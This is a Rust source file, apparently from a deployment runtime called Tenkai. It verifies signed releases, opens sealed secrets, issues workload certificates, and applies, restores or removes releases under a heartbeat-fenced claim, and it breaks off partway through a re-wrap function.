//! Built-in mode of the environment runtime (ADR 0048).
//!
//! A runtime in built-in mode applies a claimed step itself, with Tenkai's own
//! executors, instead of handing it to an operator program. Before anything
//! runs it verifies the release the server sent: the signature against trust
//! roots installed on this host, the manifest against the plan step, and the
//! deploy inputs against the signed artifact digest. Only then does the
//! release land in a content-addressed workdir.

use std::future::Future;
use std::path::{Component, Path, PathBuf};
use std::pin::Pin;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use anyhow::{Context as _, Result, anyhow, bail};
use base64::Engine as _;

use crate::fenced_mutation::{MutationCommand, MutationFence};
use crate::host_executor::step::{HOST_NOT_RESTORED, HostStepEnd, SpooledRelease};
use crate::manifest::{self, Manifest};
use crate::plan::{Action, HostStep, IssuerStep, Plan, RewrapStep, SealedStep, Step};
use crate::plan_approval::ApprovalEnvelope;
use crate::release_signing::TrustRoots;
use crate::runtime_agent::RuntimeClient;
use crate::runtime_delivery::{RuntimeRelease, RuntimeSealedValue, RuntimeStepReceipt};
use crate::sealed_secret::{SealedOpener, SealedTarget, SecretRef};
use crate::software_executor::{
    OpenedSecret, SoftwareApplyRequest, SoftwareDeployPhase, SoftwareExecutor,
    SoftwareExecutorKind, SoftwareExecutors, format_software_phase_error, rollback_channel_note,
    sanitize_diagnostic_text,
};

/// The value of `TENKAI_RUNTIME_EXECUTOR` that selects built-in mode.
pub const BUILTIN: &str = "builtin";

/// What a runtime in built-in mode needs from its own host. Nothing here
/// comes from the server.
pub struct BuiltinConfig {
    pub executors: SoftwareExecutors,
    /// Release signers this runtime trusts, installed on this host.
    pub release_roots: TrustRoots,
    /// Cluster configuration file the Kubernetes executors use. Without it,
    /// a Kubernetes release is refused rather than sent to an ambient one.
    pub cluster_config: Option<PathBuf>,
    /// Directory of Docker env files.
    pub secret_dir: Option<PathBuf>,
    /// Where this runtime's file sealing key lives, when it enrolled with a
    /// credential file. Without one, sealed steps are refused.
    pub sealing_dir: Option<PathBuf>,
    /// Where verified releases are placed, one directory per environment.
    pub work_root: PathBuf,
}

/// Load release-signing trust roots from `path`. The file and its directory
/// must be owned by this user and not writable by anyone else.
pub fn load_release_roots(path: &Path) -> Result<TrustRoots> {
    let raw = crate::runtime_local_approval::read_owner_only(path)?;
    let roots: TrustRoots =
        toml::from_str(&raw).with_context(|| format!("parsing {}", path.display()))?;
    roots
        .validate(crate::signature_verification::TrustRootKind::Release)
        .with_context(|| format!("validating {}", path.display()))?;
    Ok(roots)
}

/// Run `step` of plan `plan_id` with a built-in executor while the claim at
/// `generation` holds, as the server applies a step: a rollback first removes
/// the outgoing release; the executor or the shell `deploy.install` runs, then
/// `deploy.health`. A failed restart re-applies the current pin. A failed
/// activation runs failed-apply cleanup when the release declares
/// `deploy.uninstall`, then restores the release the step replaced. A
/// removal removes the release once and is never restored.
///
/// A host step instead goes to this host's applier once, with `approvals`,
/// and is never cleaned up or restored ([`Run::host`]).
///
/// A failed step is a receipt. `Err` means the claim was fenced or its state
/// is unknown: nothing is reported, and the plan is retried under a later
/// claim.
pub(crate) async fn execute_step(
    client: &RuntimeClient,
    config: &Arc<BuiltinConfig>,
    plan: &Plan,
    generation: u64,
    step: &Step,
    approvals: &[ApprovalEnvelope],
) -> Result<RuntimeStepReceipt> {
    let plan_id = plan.id.as_str();
    let receipt = |result: Result<(), String>| RuntimeStepReceipt {
        step_id: step.id.clone(),
        succeeded: result.is_ok(),
        detail: result
            .err()
            .unwrap_or_else(|| "built-in executor completed successfully".into()),
        wraps: Vec::new(),
    };
    let run = Run {
        client,
        config,
        plan_id,
        generation,
    };
    if let Some(host) = step.host {
        return Ok(receipt(run.host(plan, step, host, approvals).await?));
    }
    if let Some(issuer) = &step.issuer {
        return run.issuer(step, issuer).await;
    }
    if let Some(rewrap) = &step.rewrap {
        return run.rewrap(step, rewrap).await;
    }
    let target = match run.prepare(step, false).await? {
        Ok(target) => target,
        Err(detail) => return Ok(receipt(Err(detail))),
    };
    let restart = step.action == Action::Restart;
    // Like the server, everything is verified before anything mutates.
    let restore = match step.from.as_deref().filter(|_| !restart) {
        Some(_) if step.restore.is_some() => match run.prepare(step, true).await? {
            Ok(restore) => Some(restore),
            Err(detail) => return Ok(receipt(Err(detail))),
        },
        _ => None,
    };
    // A product keeps one executor (ADR 0041), read from the restore pin or,
    // without one, from what the server says the step replaces.
    let installed = match &restore {
        Some(restore) => Some(restore.manifest.deploy.executor),
        None => target.replaced_executor,
    };
    if let Some(installed) = installed
        && let Err(error) = config.executors.require_same_executor(
            &step.product,
            installed,
            target.manifest.deploy.executor,
        )
    {
        return Ok(receipt(Err(format!("{error:#}"))));
    }
    // A missing target is refused before anything mutates: nothing to
    // clean up or restore.
    if let Some(executor) = &target.executor
        && let Err(error) = executor.require_target(&target.request)
    {
        return Ok(receipt(Err(
            target.phase_error(SoftwareDeployPhase::Apply, &error.to_string())
        )));
    }

    // A removal runs the release's own executor, or its `deploy.uninstall`,
    // and is never restored (ADR 0049).
    if step.action == Action::Remove {
        return Ok(receipt(run.remove(&target, false).await?));
    }
    if step.action == Action::Rollback
        && let Some(outgoing) = &restore
        && outgoing
            .manifest
            .deploy
            .uninstall
            .as_deref()
            .is_some_and(|command| !command.is_empty())
        && let Err(detail) = run.remove(outgoing, false).await?
    {
        return Ok(receipt(Err(format!(
            "rollback blocked: outgoing release cleanup failed: {detail}"
        ))));
    }
    let Err(failure) = run.apply(&target, restart).await? else {
        return Ok(receipt(Ok(())));
    };
    if restart {
        let reapplied = run.apply(&target, false).await?.is_ok();
        return Ok(receipt(Err(if reapplied {
            format!("{failure}; current pin remains deployed")
        } else {
            format!("{failure}; re-apply of the current pin also failed")
        })));
    }
    let failure = match target.manifest.deploy.uninstall {
        Some(_) => match run.remove(&target, true).await? {
            Ok(()) => format!("{failure}; cleaned up failed install"),
            Err(cleanup) => format!("{failure}; cleanup also failed: {cleanup}"),
        },
        None => failure,
    };
    let Some(previous) = step.from.as_deref() else {
        return Ok(receipt(Err(failure)));
    };
    let Some(restore) = restore else {
        return Ok(receipt(Err(format!(
            "{failure}; step {} has no pinned restore release",
            step.id
        ))));
    };
    let note = rollback_channel_note(&step.product, previous);
    Ok(receipt(Err(match run.apply(&restore, false).await? {
        Ok(()) => format!("{failure}; restored {previous}; {note}"),
        Err(detail) => {
            let detail = restore.phase_error(SoftwareDeployPhase::Restore, &detail);
            format!(
                "{failure}; restore or health check of {previous} also failed: {detail}; {note}"
            )
        }
    })))
}

/// A release verified and placed here, with the executor it runs with.
struct Prepared {
    manifest: Manifest,
    /// The manifest text exactly as signed, and its signature.
    raw_manifest: String,
    signature: crate::release_signing::SignatureEnvelope,
    request: SoftwareApplyRequest,
    /// The signed digest the placed inputs hash to.
    artifact_digest: String,
    /// See [`VerifiedRelease::replaced_executor`].
    replaced_executor: Option<Option<SoftwareExecutorKind>>,
    /// See [`VerifiedRelease::sealed`].
    sealed: Vec<RuntimeSealedValue>,
    /// `None` is the shell `deploy.install` path.
    executor: Option<Arc<dyn SoftwareExecutor>>,
}

impl Prepared {
    /// Whether a shell command left the signed deploy inputs as placed, as
    /// the server checks after one.
    fn intact(&self) -> Result<(), String> {
        let digest = manifest::identity_digest(
            &self.request.workdir,
            &self.manifest.immutable_inputs(),
            &self.manifest.artifacts,
        );
        match digest {
            Ok(digest) if digest == self.artifact_digest => Ok(()),
            _ => Err("immutable deployment inputs changed while executing release".into()),
        }
    }

    fn phase_error(&self, phase: SoftwareDeployPhase, detail: &str) -> String {
        format_software_phase_error(
            phase,
            &self.request.product,
            &self.request.version,
            &self.request.environment,
            detail,
        )
    }
}

/// One claimed step's context on this runtime.
struct Run<'a> {
    client: &'a RuntimeClient,
    config: &'a Arc<BuiltinConfig>,
    plan_id: &'a str,
    generation: u64,
}

impl Run<'_> {
    /// Fetch, verify and place the step's target, or with `restore` its
    /// restore pin. The inner `Err` is the reason for the step's receipt.
    async fn prepare(&self, step: &Step, restore: bool) -> Result<Result<Prepared, String>> {
        let release = match self
            .client
            .fetch_release(self.plan_id, self.generation, step, restore)
            .await?
        {
            Ok(release) => release,
            Err(detail) => return Ok(Err(detail)),
        };
        let verified = tokio::task::spawn_blocking({
            let config = self.config.clone();
            let environment = self.client.environment().to_owned();
            let step = step.clone();
            move || {
                let expected = if restore {
                    Expected::restore(&step).with_context(|| {
                        format!("step {} has no pinned restore release", step.id)
                    })?
                } else {
                    Expected::target(&step)
                };
                let verified = config.verify(release, &environment, &expected)?;
                config.admit_executor(
                    &verified.manifest,
                    !step.sealed.is_empty() || verified.request.identity.is_some(),
                    step.host.is_some() && !restore,
                )?;
                Ok::<_, anyhow::Error>(verified)
            }
        })
        .await?;
        let refused =
            |error: anyhow::Error| Ok(Err(sanitize_diagnostic_text(&format!("{error:#}"))));
        let VerifiedRelease {
            manifest,
            raw_manifest,
            signature,
            request,
            artifact_digest,
            replaced_executor,
            sealed,
        } = match verified {
            Ok(verified) => verified,
            Err(error) => return refused(error),
        };
        // A host release runs through the applier, not an executor.
        let executor = if manifest.deploy.executor == Some(SoftwareExecutorKind::Host) {
            None
        } else {
            match self.config.executors.resolve(manifest.deploy.executor) {
                Ok(executor) => executor,
                Err(error) => return refused(error),
            }
        };
        Ok(Ok(Prepared {
            manifest,
            raw_manifest,
            signature,
            request,
            artifact_digest,
            replaced_executor,
            sealed,
            executor,
        }))
    }

    /// The fence of a shell mutation, and the command it runs for `release`.
    fn shell<'a>(
        &'a self,
        lock: &'a Path,
        release: &'a Prepared,
        command: &'a str,
    ) -> (ClaimFence<'a>, MutationCommand<'a>) {
        (
            ClaimFence {
                client: self.client,
                plan_id: self.plan_id,
                generation: self.generation,
            },
            MutationCommand {
                lock_path: lock,
                workdir: &release.request.workdir,
                environment: &release.request.environment,
                product: &release.request.product,
                instance: &release.request.instance,
                command,
            },
        )
    }

    /// Run host `step` once through this host's applier (ADR 0048 §2): the
    /// request is the claimed plan, the verified signed release, and the
    /// plan's approvals, which the applier verifies itself against its own
    /// trust and records. [`fence_host_units`] ran when the plan was claimed.
    /// A failed host step is never cleaned up, re-applied, or restored.
    async fn host(
        &self,
        plan: &Plan,
        step: &Step,
        host: HostStep,
        approvals: &[ApprovalEnvelope],
    ) -> Result<Result<(), String>> {
        let target = match self.prepare(step, false).await? {
            Ok(target) => target,
            Err(detail) => return Ok(Err(detail)),
        };
        let did_not_run = |detail: String| {
            Err(format!(
                "host {} of {} {} did not run: {detail}",
                host.action, step.product, step.to
            ))
        };
        if target.manifest.deploy.executor != Some(SoftwareExecutorKind::Host) {
            return Ok(did_not_run(format!(
                "step {} is a host step, and {} is not a host release",
                step.id, step.release_id
            )));
        }
        let applier = match self.config.executors.host() {
            Ok(applier) => applier,
            Err(error) => return Ok(did_not_run(format!("{error:#}"))),
        };
        let request = match crate::host_apply::HostApplyRequest::new(
            plan,
            &step.id,
            host.action,
            &target.raw_manifest,
            target.signature.clone(),
            approvals,
        ) {
            Ok(request) => request,
            Err(error) => return Ok(did_not_run(format!("{error:#}"))),
        };
        let mut fence = ClaimFence {
            client: self.client,
            plan_id: self.plan_id,
            generation: self.generation,
        };
        let environment = self.client.environment();
        let inputs = target.manifest.immutable_inputs();
        let dependency_document = &target.request.dependency_document;
        // The opened values go to the applier with the ciphertexts they were
        // opened from, which it binds to the approved step, and with the
        // workload certificate the step issued.
        let issued = target.request.identity.as_ref();
        let spools = !target.request.opened_secrets.is_empty() || issued.is_some();
        let sealed = spools.then(|| {
            crate::host_apply::sealed::HostSealedValues::new(
                target
                    .request
                    .opened_secrets
                    .iter()
                    .zip(&target.sealed)
                    .map(
                        |(opened, delivered)| crate::host_apply::sealed::HostSealedValue {
                            secret: opened.secret.clone(),
                            key: opened.key.clone(),
                            ciphertext: delivered.sealed.ciphertext.clone(),
                            value: zeroize::Zeroizing::new(
                                base64::engine::general_purpose::STANDARD.encode(&*opened.value),
                            ),
                        },
                    )
                    .collect(),
                issued.map(Into::into),
            )
        });
        let ended = crate::host_executor::step::run(
            &mut fence,
            applier,
            &request,
            &SpooledRelease {
                environment,
                product: &step.product,
                release_digest: &step.release_digest,
                root: &target.request.workdir,
                inputs: &inputs,
                artifact_digest: &target.artifact_digest,
                dependency_document: (!dependency_document.is_empty())
                    .then_some(dependency_document.as_str()),
                sealed: sealed.as_ref(),
            },
        )
        .await?;
        Ok(host_outcome(step, host, ended))
    }

    /// Re-wrap every sealed value `step` names for its recipient (ADR 0045
    /// §5). Nothing is deployed, so the release is neither verified nor
    /// placed: only its sealed values are used, each checked against the
    /// approved step before it is opened. The wraps go back on the receipt.
    async fn rewrap(&self, step: &Step, rewrap: &RewrapStep) -> Result<RuntimeStepReceipt> {
        let failed = |detail: String| RuntimeStepReceipt {
            step_id: step.id.clone(),
            succeeded: false,
            detail,
            wraps: Vec::new(),
        };
        let release = match self
            .client
            .fetch_release(self.plan_id, self.generation, step, false)
            .await?
        {
            Ok(release) => release,
            Err(detail) => return Ok(failed(detail)),
        };
        let wrapped = tokio::task::spawn_blocking({
            let config = self.config.clone();
            let environment = self.client.environment().to_owned();
            let step = step.clone();
            let rewrap = rewrap.clone();
            move || config.rewrap_sealed(&release, &environment, &step, &rewrap)
        })
        .await?;
        Ok(match wrapped {
            Ok(wraps) => RuntimeStepReceipt {
                step_id: step.id.clone(),
                succeeded: true,
                detail: format!(
                    "re-wrapped {} sealed values for {}",
                    wraps.len(),
                    rewrap.fingerprint
                ),
                wraps,
            },
            Err(error) => failed(sanitize_diagnostic_text(&format!(
                "re-wrapping for {} failed: {error:#}",
                rewrap.fingerprint
            ))),
        })
    }

    /// Run an identity issuer step (ADR 0046 §2): open the key it carries
    /// and refuse it unless its public half has the approved fingerprint.
    /// Activation reports only that; a re-wrap also wraps the key for the
    /// step's recipient. The key never leaves this process unsealed and is
    /// never named in a receipt.
    async fn issuer(&self, step: &Step, issuer: &IssuerStep) -> Result<RuntimeStepReceipt> {
        let opened = tokio::task::spawn_blocking({
            let config = self.config.clone();
            let environment = self.client.environment().to_owned();
            let rewrap = step.rewrap.clone();
            let issuer = issuer.clone();
            move || config.run_issuer(&environment, &issuer, rewrap.as_ref())
        })
        .await?;
        let key = &issuer.key;
        Ok(match opened {
            Ok(wraps) => RuntimeStepReceipt {
                step_id: step.id.clone(),
                succeeded: true,
                detail: match &step.rewrap {
                    Some(rewrap) => format!(
                        "re-wrapped identity issuer generation {} for {}",
                        key.generation, rewrap.fingerprint
                    ),
                    None => format!(
                        "verified identity issuer generation {} with key {}",
                        key.generation, key.fingerprint
                    ),
                },
                wraps,
            },
            Err(error) => RuntimeStepReceipt {
                step_id: step.id.clone(),
                succeeded: false,
                detail: sanitize_diagnostic_text(&format!(
                    "identity issuer generation {} refused: {error:#}",
                    key.generation
                )),
                wraps: Vec::new(),
            },
        })
    }

    fn lock(&self, release: &Prepared) -> PathBuf {
        self.config
            .work_root
            .join(&release.request.environment)
            .join(".mutation.lock")
    }

    /// Apply `release` (or restart it) and run its health check.
    async fn apply(&self, release: &Prepared, restart: bool) -> Result<Result<(), String>> {
        let lock = self.lock(release);
        let request = &release.request;
        let applied = match &release.executor {
            Some(executor) => {
                if let Err(error) = executor.require_target(request) {
                    return Ok(Err(
                        release.phase_error(SoftwareDeployPhase::Apply, &error.to_string())
                    ));
                }
                if !request.artifact_pulls.is_empty()
                    && !executor.consumes_admitted_artifact_pulls()
                {
                    return Ok(Err(
                        "executor does not consume admitted environment-mirror artifact pulls"
                            .into(),
                    ));
                }
                let phase = if restart {
                    SoftwareDeployPhase::Restart
                } else {
                    SoftwareDeployPhase::Apply
                };
                run_claimed(self.client, self.plan_id, self.generation, {
                    let executor = executor.clone();
                    let request = request.clone();
                    move |stop| {
                        if restart {
                            executor.restart_until_stopped(&request, stop)
                        } else {
                            executor.apply_until_stopped(&request, stop)
                        }
                    }
                })
                .await?
                .map_err(|error| release.phase_error(phase, &format!("{error:#}")))
            }
            None if !request.artifact_pulls.is_empty() => {
                return Ok(Err(
                    "digest-bound artifacts require an executor that consumes admitted environment-mirror pulls"
                        .into(),
                ));
            }
            None => {
                let (mut fence, command) =
                    self.shell(&lock, release, &release.manifest.deploy.install);
                crate::fenced_mutation::run(&mut fence, command).await?
            }
        };
        match (applied, release.manifest.deploy.health.as_deref()) {
            (Ok(()), Some(health)) if !health.is_empty() => {
                let (mut fence, command) = self.shell(&lock, release, health);
                Ok(crate::fenced_mutation::run(&mut fence, command)
                    .await?
                    .map_err(|error| match release.executor {
                        Some(_) => release.phase_error(SoftwareDeployPhase::Health, &error),
                        None => error,
                    }))
            }
            (applied, _) => Ok(applied),
        }
        .map(|applied| match release.executor {
            // After install and health, as the server checks.
            None => applied.and_then(|()| release.intact()),
            Some(_) => applied,
        })
    }

    /// Remove `release`: with `failed_apply`, only what its failed apply
    /// left behind.
    async fn remove(&self, release: &Prepared, failed_apply: bool) -> Result<Result<(), String>> {
        let lock = self.lock(release);
        match &release.executor {
            Some(executor) => {
                if !self.client.heartbeat(self.plan_id, self.generation).await? {
                    bail!("runtime claim was fenced");
                }
                // The claim is renewed while the removal runs; losing it
                // stops an adapter that can stop, and a lost claim is
                // reported after.
                Ok(run_claimed(self.client, self.plan_id, self.generation, {
                    let executor = executor.clone();
                    let request = release.request.clone();
                    move |stop| {
                        if failed_apply {
                            executor.cleanup_failed_apply(&request)
                        } else {
                            executor.remove_until_stopped(&request, stop)
                        }
                    }
                })
                .await?
                .map_err(|error| {
                    release.phase_error(SoftwareDeployPhase::Remove, &error.to_string())
                }))
            }
            None => match release.manifest.deploy.uninstall.as_deref() {
                Some(uninstall) if !uninstall.is_empty() => {
                    let (mut fence, command) = self.shell(&lock, release, uninstall);
                    Ok(crate::fenced_mutation::run(&mut fence, command)
                        .await?
                        .and_then(|()| release.intact()))
                }
                _ => Ok(Err("release has no uninstall command".into())),
            },
        }
    }
}

/// Stop every host unit an earlier holder of this environment's claim left
/// running, before any step of the plan claimed at `generation` runs, as the
/// server does when it claims the environment lease, then remove the sealed
/// values an earlier attempt spooled for this environment. Nothing to do
/// without a host applier.
/// `Err` means the claim was fenced or a unit would not stop.
pub(crate) async fn fence_host_units(
    client: &RuntimeClient,
    config: &BuiltinConfig,
    plan_id: &str,
    generation: u64,
) -> Result<()> {
    let Ok(host) = config.executors.host() else {
        return Ok(());
    };
    crate::host_executor::step::fence_environment(
        &mut ClaimFence {
            client,
            plan_id,
            generation,
        },
        host,
        client.environment(),
    )
    .await?;
    host.discard_sealed(client.environment()).await
}

/// A host step's receipt from how it ended: only a recorded success
/// succeeds.
fn host_outcome(step: &Step, host: HostStep, ended: HostStepEnd) -> Result<(), String> {
    let what = format!("host {} of {} {}", host.action, step.product, step.to);
    match ended {
        HostStepEnd::Recorded(result) if result.outcome.succeeded() => Ok(()),
        HostStepEnd::Recorded(result) => Err(format!(
            "{what} ended {:?}: {}; {HOST_NOT_RESTORED}",
            result.outcome, result.detail
        )),
        HostStepEnd::Unknown(detail) => {
            Err(format!("{what} failed: {detail}; {HOST_NOT_RESTORED}"))
        }
        HostStepEnd::NotRun(detail) => Err(format!("{what} did not run: {detail}")),
    }
}

/// Run a blocking executor call while renewing the claim every 30 seconds.
/// Once the claim is fenced, or its renewal outcome is unknown, `work` is
/// asked to stop and the outer `Err` reports why.
async fn run_claimed<T: Send + 'static>(
    client: &RuntimeClient,
    plan_id: &str,
    generation: u64,
    work: impl FnOnce(&AtomicBool) -> Result<T> + Send + 'static,
) -> Result<Result<T>> {
    /// Stops the work when this future is dropped: it must not run unfenced.
    struct StopOnDrop(Arc<AtomicBool>);
    impl Drop for StopOnDrop {
        fn drop(&mut self) {
            self.0.store(true, Ordering::SeqCst);
        }
    }
    let stop = Arc::new(AtomicBool::new(false));
    let _stop_on_drop = StopOnDrop(stop.clone());
    let mut running = tokio::task::spawn_blocking({
        let stop = stop.clone();
        move || work(&stop)
    });
    let mut renew = tokio::time::interval(Duration::from_secs(30));
    renew.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    renew.tick().await;
    let mut lost = None;
    let finished = loop {
        tokio::select! {
            joined = &mut running => break joined,
            _ = renew.tick(), if lost.is_none() => {
                let error = match client.heartbeat(plan_id, generation).await {
                    Ok(true) => continue,
                    Ok(false) => anyhow!("runtime claim was fenced"),
                    Err(error) => error.context("runtime heartbeat outcome is ambiguous"),
                };
                stop.store(true, Ordering::SeqCst);
                lost = Some(error);
            }
        }
    };
    let finished = finished.context("built-in executor task failed")?;
    match lost {
        Some(error) => Err(error),
        None => Ok(finished),
    }
}

/// The claim as the fence of a shell mutation: refreshing renews it.
struct ClaimFence<'a> {
    client: &'a RuntimeClient,
    plan_id: &'a str,
    generation: u64,
}

impl MutationFence for ClaimFence<'_> {
    fn generation(&self) -> u64 {
        self.generation
    }

    fn refresh(&mut self) -> Pin<Box<dyn Future<Output = Result<()>> + Send + '_>> {
        Box::pin(async move {
            if !self.client.heartbeat(self.plan_id, self.generation).await? {
                bail!("runtime claim was fenced");
            }
            Ok(())
        })
    }
}

/// What the plan says a release package must be.
pub struct Expected<'a> {
    pub product: &'a str,
    pub instance: &'a str,
    pub version: &'a str,
    pub release_id: &'a str,
    pub release_digest: &'a str,
    pub artifact_digest: &'a str,
    /// The sealed values the step writes. A restore writes the same ones:
    /// they belong to the instance, not the release.
    pub sealed: &'a [SealedStep],
    /// The workload certificate the step grants (ADR 0046 §3).
    pub identity: Option<&'a crate::workload_identity::IdentityGrant>,
    /// Whether the step issues a certificate: not when it removes the
    /// release, nor in a host health step, which checks what its install
    /// wrote.
    pub issues: bool,
}

impl<'a> Expected<'a> {
    /// The release `step` installs.
    pub fn target(step: &'a Step) -> Self {
        Self {
            product: &step.product,
            instance: step.instance_name(),
            version: &step.to,
            release_id: &step.release_id,
            release_digest: &step.release_digest,
            artifact_digest: &step.artifact_digest,
            sealed: &step.sealed,
            identity: step.identity.as_ref(),
            issues: step.action != Action::Remove
                && step
                    .host
                    .as_ref()
                    .is_none_or(|host| host.action != crate::plan::HostAction::Health),
        }
    }

    /// The release `step` replaces, from its restore pin. `None` without one.
    pub fn restore(step: &'a Step) -> Option<Self> {
        let (pin, version) = (step.restore.as_ref()?, step.from.as_deref()?);
        Some(Self {
            product: &step.product,
            instance: step.instance_name(),
            version,
            release_id: &pin.release_id,
            release_digest: &pin.digest,
            artifact_digest: &pin.artifact_digest,
            sealed: &step.sealed,
            identity: step.restore_identity.as_ref(),
            issues: true,
        })
    }
}

/// A release that verified for one plan step, placed in its workdir.
#[derive(Debug)]
pub struct VerifiedRelease {
    pub manifest: Manifest,
    /// The manifest text exactly as signed, and its signature.
    pub raw_manifest: String,
    pub signature: crate::release_signing::SignatureEnvelope,
    /// The server's request with this host's workdir, cluster configuration,
    /// and secret directory filled in.
    pub request: SoftwareApplyRequest,
    /// The signed digest the placed inputs hash to.
    pub artifact_digest: String,
    /// The declared executor of the release the step replaces, when the
    /// server sent it: `Some(None)` declares none.
    pub replaced_executor: Option<Option<SoftwareExecutorKind>>,
    /// The sealed values as delivered, which `request.opened_secrets` was
    /// opened from and matches slot for slot. A host step passes their
    /// ciphertexts to the applier.
    pub sealed: Vec<RuntimeSealedValue>,
}

impl BuiltinConfig {
    /// Verify `release` against what the plan step `expected` names in
    /// `environment`, place its deploy inputs, and return the request to run.
    pub fn verify(
        &self,
        release: RuntimeRelease,
        environment: &str,
        expected: &Expected<'_>,
    ) -> Result<VerifiedRelease> {
        let manifest_digest = manifest::digest(&release.manifest);
        if manifest_digest != expected.release_digest {
            bail!("the release manifest does not match the plan step's release digest");
        }
        let manifest =
            manifest::parse_raw(&release.manifest).context("the release manifest is not valid")?;
        let (name, version) = (&manifest.product.name, &manifest.product.version);
        if expected.product != name
            || expected.version != version
            || expected.release_id != crate::ontology::release_id(name, version)
        {
            bail!(
                "the plan step names {} {}, but the signed manifest is {name} {version}",
                expected.product,
                expected.version
            );
        }
        crate::release_signing::verify_release(
            &release.signature,
            &self.release_roots,
            &manifest_digest,
            expected.artifact_digest,
        )
        .context("verifying the release signature against this runtime's trust roots")?;

        let mut request = release.request;
        if request.product != expected.product
            || request.version != expected.version
            || request.environment != environment
            || request.instance_name() != expected.instance
            || request.release_id != format!("tenkai:release:{name}@{version}")
        {
            bail!("the server's executor request does not match the plan step");
        }
        let pulls = request.artifact_pulls.iter().map(|pull| &pull.digest);
        if request.artifact_pulls.len() != manifest.artifacts.len()
            || !pulls.eq(manifest.artifacts.iter().map(|artifact| &artifact.digest))
        {
            bail!("the admitted artifact pulls do not match the signed manifest's artifacts");
        }

        let inputs = manifest.immutable_inputs();
        let workdir = self.place(
            environment,
            expected.product,
            expected.artifact_digest,
            &inputs,
            &manifest.artifacts,
            &release.entries,
        )?;
        request.workdir = workdir;
        request.cluster_config_path = self.cluster_config.clone();
        request.secret_dir_path = self.secret_dir.clone();
        request.opened_secrets = self.open_sealed(&release.sealed, environment, expected)?;
        request.remove_owned_secrets = true;
        request.identity =
            self.workload_identity(&manifest, release.identity_issuer, environment, expected)?;
        crate::dependency_document::check_peers(
            &request.dependency_document,
            expected.identity.map(|grant| &grant.peers),
        )?;
        let replaced_executor = match release.replaces {
            None => None,
            Some(replaced) => Some(match replaced.executor {
                None => None,
                Some(name) => Some(
                    SoftwareExecutorKind::from_name(&name)
                        .with_context(|| format!("unknown replaced executor {name:?}"))?,
                ),
            }),
        };
        Ok(VerifiedRelease {
            manifest,
            raw_manifest: release.manifest,
            signature: release.signature,
            sealed: release.sealed,
            request,
            artifact_digest: expected.artifact_digest.to_owned(),
            replaced_executor,
        })
    }

    /// The workload certificate for this apply (ADR 0046 §3). For the step's
    /// target, the grant the verified manifest gives must be the one the
    /// approved step names, and the delivered issuer the granted one; the
    /// runtime then issues a fresh key and certificate. A restore issues
    /// from the step's restore grant, so the release it puts back gets its
    /// own names. Errors name the grant, never key material.
    fn workload_identity(
        &self,
        manifest: &Manifest,
        issuer: Option<crate::identity_issuer::IssuerKey>,
        environment: &str,
        expected: &Expected<'_>,
    ) -> Result<Option<crate::workload_identity::IssuedIdentity>> {
        // A removal issues nothing, and its executor deletes the
        // certificate with the release; a host health step keeps the one
        // its install wrote.
        if !expected.issues {
            return Ok(None);
        }
        let (section, grant) = match (&manifest.deploy.identity, expected.identity) {
            (None, None) => return Ok(None),
            (Some(section), Some(grant)) => (section, grant),
            (None, Some(_)) => bail!(
                "the plan step grants a workload certificate, and the signed manifest asks for none"
            ),
            (Some(_), None) => bail!(
                "the signed manifest asks for a workload certificate, and the plan step grants none"
            ),
        };
        let issuer = issuer.context("the server sent no identity issuer for the step")?;
        // Peers come from the approved bindings, not the manifest; the
        // dependency document is checked against them.
        let computed = crate::workload_identity::IdentityGrant {
            peers: grant.peers.clone(),
            ..crate::workload_identity::grant(section, environment, expected.instance, &issuer)?
        };
        if &computed != grant {
            bail!(
                "the plan step's workload certificate grant ({}, {:?}) is not what the signed manifest gives ({}, {:?}) with the identity issuer the server sent",
                grant.uri,
                grant.dns_names,
                computed.uri,
                computed.dns_names
            );
        }
        let dir = self.sealing_dir.as_deref().context(
            "the step issues a workload certificate, and this runtime has no sealing key (enroll with --credential-file)",
        )?;
        let key = issuer.open(environment, &SealedOpener::load(dir)?)?;
        // Kept for renewal without the server. Optional: a failed write
        // only delays renewal until the next step that grants one.
        if let Err(error) = crate::identity_issuer::cache_verified(dir, environment, &issuer) {
            eprintln!("keeping the identity issuer for renewal failed: {error:#}");
        }
        let now_secs = crate::now_millis() / 1000;
        // The host applier installs the granted issuer alone.
        if manifest.deploy.executor == Some(SoftwareExecutorKind::Host) {
            return crate::workload_identity::issue(grant, &issuer, key, now_secs).map(Some);
        }
        issue_with_bundle(dir, environment, grant, &issuer, key, now_secs).map(Some)
    }

    /// Check the server's sealed values against the plan step, which the
    /// local approval policy covered, and open them with this runtime's own
    /// key (ADR 0045 §4). Errors name the slot, never a value.
    fn open_sealed(
        &self,
        delivered: &[RuntimeSealedValue],
        environment: &str,
        expected: &Expected<'_>,
    ) -> Result<Vec<OpenedSecret>> {
        if expected.sealed.is_empty() && delivered.is_empty() {
            return Ok(Vec::new());
        }
        let slots = delivered.iter().map(|value| (&value.secret, &value.key));
        if !slots.eq(expected.sealed.iter().map(|step| (&step.secret, &step.key))) {
            bail!("the server's sealed values do not match the plan step");
        }
        let dir = self.sealing_dir.as_deref().context(
            "the step writes sealed secrets, and this runtime has no sealing key (enroll with --credential-file)",
        )?;
        let opener = SealedOpener::load(dir)?;
        expected
            .sealed
            .iter()
            .zip(delivered)
            .map(|(step, value)| {
                let slot = SecretRef::new(&step.secret, &step.key)?;
                let target = SealedTarget::new(environment, expected.instance, slot)?;
                if crate::sealed_secret::digest(&target, &value.sealed)? != step.digest {
                    bail!(
                        "sealed {}/{} does not match the plan step's digest",
                        step.secret,
                        step.key
                    );
                }
                Ok(OpenedSecret {
                    secret: step.secret.clone(),
                    key: step.key.clone(),
                    digest: step.digest.clone(),
                    value: opener.open(&target, &value.sealed)?,
                })
            })
            .collect()
    }

    /// Wrap the data key of every sealed value `step` names for its approved
    /// recipient. The server's recipient key must have the fingerprint the
    /// step names, and each value the slot and digest the step names; only
    /// then is it opened, and only its data key is wrapped again. Errors
    /// name a slot, never a value.
    pub fn rewrap_sealed(
        &self,
        release: &RuntimeRelease,
        environment: &str,
        step: &Step,
        rewrap: &RewrapStep,
    ) -> Result<Vec<crate::sealed_secret::RecipientWrap>> {
        let recipient = crate::sealing_key::SealingPublicKey::from_wire(
            release
                .rewrap_recipient
                .as_deref()
                .context("the server sent no recipient key for the re-wrap step")?,
        )?;
        if recipient.fingerprint() != rewrap.fingerprint {
            bail!(
                "the server sent a recipient key other than the approved {}",
                rewrap.fingerprint
            );
        }
        let slots = release
            .sealed
            .iter()
